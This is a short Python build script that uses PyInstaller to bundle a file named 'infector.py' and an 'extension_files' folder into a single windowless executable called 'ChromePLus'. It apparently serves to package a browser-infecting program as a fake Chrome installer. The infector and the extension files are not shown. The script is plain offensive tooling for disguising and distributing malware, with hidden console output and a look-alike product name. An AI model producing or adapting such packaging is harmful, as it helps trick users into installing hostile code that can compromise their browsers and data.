import os
import subprocess
import sys

SCRIPT_NAME = "infector.py"         
EXE_NAME = "ChromePLus"    
ICON_PATH = ""                      
EXTENSION_FOLDER = "extension_files"  

def build_exe():
    print(f"[*] Starting build process for {EXE_NAME}...")


    try:
        import PyInstaller
    except ImportError:
        print("[-] PyInstaller not found. Installing now...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", "pyinstaller"])

    separator = ";" if os.name == 'nt' else ":"
    
    cmd = [
        "pyinstaller",
        "--onefile",
        "--noconsole",
        f"--name={EXE_NAME}",
        f"--add-data={EXTENSION_FOLDER}{separator}{EXTENSION_FOLDER}",
        SCRIPT_NAME
    ]

    if ICON_PATH and os.path.exists(ICON_PATH):
        cmd.append(f"--icon={ICON_PATH}")

    # 3. Ажиллуулах
    try:
        subprocess.run(cmd, check=True)
        print("-" * 30)
        print(f"[+] Success! Your installer is in the 'dist' folder.")
        print(f"[+] File: dist/{EXE_NAME}.exe")
    except subprocess.CalledProcessError as e:
        print(f"[-] Error during build: {e}")

if __name__ == "__main__":
    if not os.path.exists(SCRIPT_NAME):
        print(f"[-] {SCRIPT_NAME} not found! Check your file name.")
    elif not os.path.exists(EXTENSION_FOLDER):
        print(f"[-] {EXTENSION_FOLDER} directory missing!")
    else:
        build_exe()